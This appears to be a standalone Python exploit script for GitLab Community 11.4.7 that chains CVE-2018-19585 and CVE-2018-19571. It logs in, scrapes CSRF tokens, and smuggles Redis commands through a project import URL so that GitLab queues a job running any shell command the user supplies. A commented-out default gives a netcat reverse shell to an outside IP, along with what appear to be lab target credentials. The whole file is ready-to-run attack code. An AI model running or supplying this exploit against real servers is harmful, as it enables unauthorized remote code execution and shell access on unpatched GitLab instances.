## Gitlab RCE affected Gitlab Community 11.4.7
## Referenced from https://www.exploit-db.com/exploits/49257
## This exploit is a combination of CVE-2018-19585 and CVE-2018-19571
import requests
from bs4 import BeautifulSoup
import random
import argparse

def login(url, username, password, session):
    r = session.get(url + "/users/sign_in")
    soup = BeautifulSoup(r.text, features="lxml")
    token = soup.findAll('meta')[16].get("content")
    print("[*] Obtained authenticity token: {token}".format(token=token))
    login_payload = {
        "authenticity_token": token,
        "user[login]": username,
        "user[password]": password,
        "user[remember_me]": "0"
    }
    login_url = "{url}/users/sign_in".format(url=url)
    login_request = session.post(login_url, data=login_payload)
    if "<title>Sign in Â· GitLab</title>" in login_request.text:
        print("[!] Unable to login to Gitlab. Please check your credentials")
        return None
    else:
        print("[*] Successful login to Gitlab")
        return session

def exploit(url, username, password, session, command):
    git_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2F.git"
    project_name = "project{number}".format(number=random.randrange(1,10000))
    print("[*] Creating random project: {project_name}".format(project_name=project_name))
    r = session.get("{url}/projects/new".format(url=url))
    soup = BeautifulSoup(r.text, features="lxml")
    namespace_id = soup.find('input', {'name': 'project[namespace_id]'}).get('value')
    project_token = soup.findAll('meta')[16].get("content").replace("==", "%3D%3D").replace("+", "%2B")
    print("[*] Obtaining project token: {project_token}".format(project_token=project_token))
    print("[*] Obtaining namespace id: {namespace_id}".format(namespace_id=namespace_id))
    exploit_payload = """\nmulti
    sadd resque:gitlab:queues system_hook_push
    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + '{command}'.format(command=command) + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
    exec
    exec
    exec\n"""
    payload = "utf8=%E2%9C%93&authenticity_token={project_token}&project%5Bimport_url%5D={git_url}{exploit_payload}&project%5Bci_cd_only%5D=false&project%5Bname%5D={project_name}&project%5Bnamespace_id%5D={namespace_id}&project%5Bpath%5D={project_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0".format(project_token=project_token, git_url=git_url,exploit_payload=exploit_payload, namespace_id=namespace_id, project_name=project_name)
    print("[*] Crafted exploit payload")
    cookies = {
        'sidebar_collapsed': 'false',
        'event_filter': 'all',
        'hide_auto_devops_implicitly_enabled_banner_1': 'false',
        '_gitlab_session': session.cookies['_gitlab_session'],
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': '{url}/projects'.format(url=url),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '398',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    r = session.post('{url}/projects'.format(url=url), data=payload, cookies=cookies, headers=headers, verify=False)
    print("[*] Sending exploit payload")
    if "The change you requested was rejected." in r.text:
        print("[!] Exploit failed. Please check your parameters!")
        return
    else:
        print("[*] Exploit completed successfully!")
    
def main(url, username, password, session, command):
    login_session = login(url, username, password, session)
    if login_session is None:
        return
    else:
        exploit(url, username, password, login_session, command)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-l', '--url', help='Target url')
    parser.add_argument('-c', '--command', help='Command to execute')
    args = parser.parse_args()
    #url = "http://ready.htb:5080"
    #username = "testaccount"
    #password = "E123456789fg"
    #command = "nc 10.10.16.3 4000 -e /bin/bash"
    session = requests.Session()
    main(args.url, args.username, args.password, session, args.command)
